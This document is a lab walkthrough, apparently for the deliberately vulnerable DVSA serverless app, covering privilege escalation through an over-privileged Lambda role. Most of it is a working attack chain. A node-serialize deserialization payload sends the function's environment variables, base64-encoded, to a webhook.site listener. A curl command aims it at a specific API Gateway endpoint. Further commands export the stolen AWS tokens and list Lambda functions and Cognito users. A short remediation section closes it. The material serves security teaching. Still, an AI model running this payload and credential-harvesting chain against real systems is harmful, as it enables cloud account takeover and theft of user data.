
In this scenario, we exploit an insecure deserialization flaw (from Lesson 1) to leak the Lambda function’s environment variables. We then use the harvested AWS credentials to impersonate the function locally and perform administrative tasks that should be restricted.

---

# Lesson 7: Over-Privileged Access & Privilege Escalation

## 1. Overview
Lambda functions require an **Execution Role** to interact with other AWS services. If this role is "over-privileged" (e.g., has `Resource: "*"` or broad administrative permissions), an attacker who gains code execution can steal the temporary security tokens and take over the entire cloud environment.

### Vulnerability Chain
1.  **Insecure Deserialization (Lesson 1):** We use the `_$$ND_FUNC$$_` prefix to execute arbitrary Node.js code.
2.  **Environment Variable Leakage:** Lambda stores temporary AWS credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`) in its environment variables.
3.  **Over-Privileged IAM Role:** The `DVSA-ORDER-MANAGER` role has excessive permissions, allowing for the enumeration of users, functions, and database records across the account.

---

## 2. Reproduction Steps

### Step 1: Set Up a Listener
To capture the leaked credentials, you need an external endpoint.
1.  Navigate to [Webhook.site](https://webhook.site).
2.  Copy your unique **Webhook URL** (e.g., `https://webhook.site/your-unique-id`).

---

### Step 2: Extract AWS Credentials
We will inject a script that reads the `process.env` object (containing the temporary AWS tokens), Base64 encodes it, and sends it to our webhook.

**The Exploit Payload:**
```javascript
_$$ND_FUNC$$_function(){
    require('https').get('https://webhook.site/YOUR_UNIQUE_ID?' + Buffer.from(JSON.stringify(process.env)).toString('base64'));
}()
```

**Run the following command (via Burp Suite or Curl):**
```bash
curl -X POST https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{
  "action": "_$$ND_FUNC$$_function(){require(\"https\").get(\"https://webhook.site/YOUR_UNIQUE_ID?\" + Buffer.from(JSON.stringify(process.env)).toString(\"base64\"));}()"
}'
```

**[Screenshot: Burp Suite Repeater showing the payload being sent and a 200 OK response]**

---

### Step 3: Decode and Harvest Tokens
1.  Go back to your **Webhook.site** tab. You should see a new request.
2.  Copy the long Base64 string from the query parameters.
3.  Use a tool like **CyberChef** (Recipe: "From Base64" -> "JSON Beautify") to decode the string.
4.  Locate the following values:
    * `AWS_ACCESS_KEY_ID`
    * `AWS_SECRET_ACCESS_KEY`
    * `AWS_SESSION_TOKEN`

**[Screenshot: Webhook.site receiving the request and CyberChef decoding the tokens]**

---

### Step 4: Assume the Lambda Identity Locally
Export the stolen credentials into your local terminal. This "tricks" the AWS CLI into thinking your computer is the `DVSA-ORDER-MANAGER` Lambda function.

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="abcd..."
export AWS_SESSION_TOKEN="FQoG..."
```

**Verify the identity:**
```bash
aws sts get-caller-identity
```
*Expected Output: The ARN should show the `DVSA-ORDER-MANAGER` role.*

---

### Step 5: Administrative Enumeration
Now that you have the function's identity, test the extent of its over-privilege by listing sensitive resources.

**1. List all Lambda Functions in the account:**
```bash
aws lambda list-functions --region us-east-1 --query 'Functions[].FunctionName'
```

**2. List all Users in the Cognito User Pool:**
```bash
aws cognito-idp list-users --user-pool-id us-east-1_I4Cl5t67w --region us-east-1
```

**3. Exfiltrate specific User Data:**
Pick a `Username` (ID) from the previous step and invoke the user-account function directly to get their full profile, including their "IsAdmin" status and email.
```bash
aws lambda invoke --function-name DVSA-USER-ACCOUNT --payload '{"user": "TARGET_USER_ID"}' --region us-east-1 response.json
cat response.json
```

**[Screenshot: Terminal showing a successful list of all users and the "DVSA Administrator" profile details]**

---

## 3. Impact & Remediation

| Impact | Description |
|--------|-------------|
| **Credential Theft** | Permanent or temporary AWS tokens leaked via code injection. |
| **Account Takeover** | Attacker can list and modify functions, users, and databases. |
| **Data Exfiltration** | Accessing sensitive user data (Cognito) and order history. |

### Remediation Strategies

1.  **Enforce Least Privilege:**
    Update the IAM policy for the Lambda function. Never use `Resource: "*"`. Explicitly list only the ARNs of the DynamoDB tables or S3 buckets the function *must* access.
    
2.  **Use IAM Condition Keys:**
    Restrict access so that the credentials can only be used from within the AWS environment or a specific VPC, preventing "local impersonation" from an attacker's machine.

3.  **Sanitize Inputs:**
    Fix the root cause (Insecure Deserialization) to prevent the initial code execution that leads to the credential leak.
